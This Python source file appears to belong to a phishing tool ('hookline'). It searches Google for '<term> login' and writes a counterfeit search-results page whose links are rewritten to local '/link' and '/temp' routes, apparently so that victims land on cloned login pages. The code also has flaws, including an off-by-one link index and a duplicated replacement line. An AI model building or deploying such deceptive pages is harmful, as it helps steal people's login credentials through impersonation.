#import
from googlesearch import search

#glone.clone
def clone(searcht, template):
	urls=[]
	for j in search(searcht+" login", tld="com", num=6, stop=6):
		print(j)
		#add google results to array
		urls.append(j)

	#reads Search.html (do not alter this file unless you know what you're doing) 
	f = open("Search.html","r")
	SearchRead = f.read()
	SearchRead = SearchRead.replace("%1%",urls[0]).replace("$1$",searcht).replace("%term%",searcht)
	
	#replaces the first link with your custom template if one is in use
	if template:
		SearchRead = SearchRead.replace(">1>","/temp?temp="+searcht)
	
	#replaces links with hookline links
	for i in range(0,len(urls)):
		
		#displayed link
		percent = "%"+str(i)+"%"

		#page name
		dollar = "$"+str(i)+"$"

		#href
		link = ">"+str(i)+">"
		if len(urls[i]) > 25:
			SearchRead = SearchRead.replace(percent,urls[i][:25]+"...")
		else:
			SearchRead = SearchRead.replace(percent,urls[i])
		if urls[i].replace("https://","").split(".")[0] == "www":
			SearchRead = SearchRead.replace(dollar, urls[i].replace("https://","").split(".")[1])
		else:
			SearchRead = SearchRead.replace(dollar, urls[i].replace("https://","").split(".")[0])
		SearchRead = SearchRead.replace(dollar, urls[i].replace("https://","").split(".")[0])
		SearchRead = SearchRead.replace(link,"/link?url="+urls[i-1])
	SearchRead = SearchRead.replace("$4$",searcht).replace("%4%",urls[0]).replace("$5$",searcht).replace("%5%",urls[0]).replace("$6$",searcht).replace("%6%",urls[0])

	#writes to template to render
	f2 = open("templates/Search2.html","w")
	f2.write(SearchRead)
	f2.flush()
	f2.close()
